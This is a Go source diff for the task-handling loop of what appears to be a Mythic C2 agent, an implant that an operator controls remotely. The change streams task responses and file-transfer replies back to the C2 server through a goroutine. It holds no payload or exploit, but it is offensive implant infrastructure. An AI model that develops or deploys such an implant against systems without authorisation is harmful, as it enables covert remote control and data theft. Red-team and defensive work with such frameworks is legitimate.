@@ -191,10 +191,7 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, ma
 
 			// Process tasks
 			for _, task := range tasks {
-				response := processTaskWithAgent(task, agent)
-				if err := c2.PostResponse(response, agent); err != nil {
-					log.Printf("[ERROR] Failed to post response: %v", err)
-				}
+				processTaskWithAgent(task, agent, c2)
 			}
 
 			// Sleep before next iteration
@@ -207,47 +204,110 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, ma
 	}
 }
 
-func processTaskWithAgent(task structs.Task, agent *structs.Agent) structs.Response {
+func processTaskWithAgent(task structs.Task, agent *structs.Agent, c2 profiles.Profile) {
 	log.Printf("[INFO] Processing task: %s (ID: %s)", task.Command, task.ID)
-
-	response := structs.Response{
-		TaskID: task.ID,
-	}
 
 	// Create Job struct with channels for this task
 	job := &structs.Job{
 		Stop:              new(int),
-		SendResponses:     make(chan structs.Response, 10),
+		SendResponses:     make(chan structs.Response, 100),
 		SendFileToMythic:  files.SendToMythicChannel,
 		GetFileFromMythic: files.GetFromMythicChannel,
 		FileTransfers:     make(map[string]chan json.RawMessage),
 	}
 	task.Job = job
 
+	// Start goroutine to forward responses from the job to Mythic
+	done := make(chan bool)
+	go func() {
+		for {
+			select {
+			case resp := <-job.SendResponses:
+				mythicResp, err := c2.PostResponse(resp, agent)
+				if err != nil {
+					log.Printf("[ERROR] Failed to post file transfer response: %v", err)
+					continue
+				}
+				
+				// If this is a file transfer response, route Mythic's response back
+				// Check if the response has tracking UUID in it
+				if len(mythicResp) > 0 && (resp.Upload != nil || resp.Download != nil) {
+					// Try to find a matching file transfer channel
+					// Parse the response to get tracking info
+					var responseData map[string]interface{}
+					if err := json.Unmarshal(mythicResp, &responseData); err == nil {
+						// Look for responses array
+						if responses, ok := responseData["responses"].([]interface{}); ok && len(responses) > 0 {
+							if firstResp, ok := responses[0].(map[string]interface{}); ok {
+								// Send this response to all active file transfer channels
+								// In Mythic, the response contains the file details
+								respJSON, _ := json.Marshal(firstResp)
+								for _, ch := range job.FileTransfers {
+									select {
+									case ch <- json.RawMessage(respJSON):
+									case <-time.After(100 * time.Millisecond):
+										// Channel full or closed, skip
+									}
+								}
+							}
+						}
+					}
+				}
+			case <-done:
+				// Drain any remaining responses
+				for {
+					select {
+					case resp := <-job.SendResponses:
+						_, err := c2.PostResponse(resp, agent)
+						if err != nil {
+							log.Printf("[ERROR] Failed to post file transfer response: %v", err)
+						}
+					default:
+						return
+					}
+				}
+			}
+		}
+	}()
+
 	// Get command handler
 	handler := commands.GetCommand(task.Command)
 	if handler == nil {
-		response.Status = "error"
-		response.UserOutput = fmt.Sprintf("Unknown command: %s", task.Command)
-		response.Completed = true
-		return response
+		response := structs.Response{
+			TaskID:    task.ID,
+			Status:    "error",
+			UserOutput: fmt.Sprintf("Unknown command: %s", task.Command),
+			Completed: true,
+		}
+		if _, err := c2.PostResponse(response, agent); err != nil {
+			log.Printf("[ERROR] Failed to post response: %v", err)
+		}
+		close(done)
+		return
 	}
 
-	// Check if command supports agent access (for sleep command)
+	// Execute command
+	var result structs.CommandResult
 	if agentHandler, ok := handler.(structs.AgentCommand); ok {
-		result := agentHandler.ExecuteWithAgent(task, agent)
-		response.UserOutput = result.Output
-		response.Status = result.Status
-		response.Completed = result.Completed
+		result = agentHandler.ExecuteWithAgent(task, agent)
 	} else {
-		// Execute regular command
-		result := handler.Execute(task)
-		response.UserOutput = result.Output
-		response.Status = result.Status
-		response.Completed = result.Completed
+		result = handler.Execute(task)
 	}
 
-	return response
+	// Send final response
+	response := structs.Response{
+		TaskID:    task.ID,
+		UserOutput: result.Output,
+		Status:    result.Status,
+		Completed: result.Completed,
+	}
+	if _, err := c2.PostResponse(response, agent); err != nil {
+		log.Printf("[ERROR] Failed to post response: %v", err)
+	}
+
+	// Signal the response forwarder to finish
+	close(done)
+	time.Sleep(100 * time.Millisecond) // Give it time to drain
 }
 
 func calculateSleepTime(interval, jitter int) time.Duration {
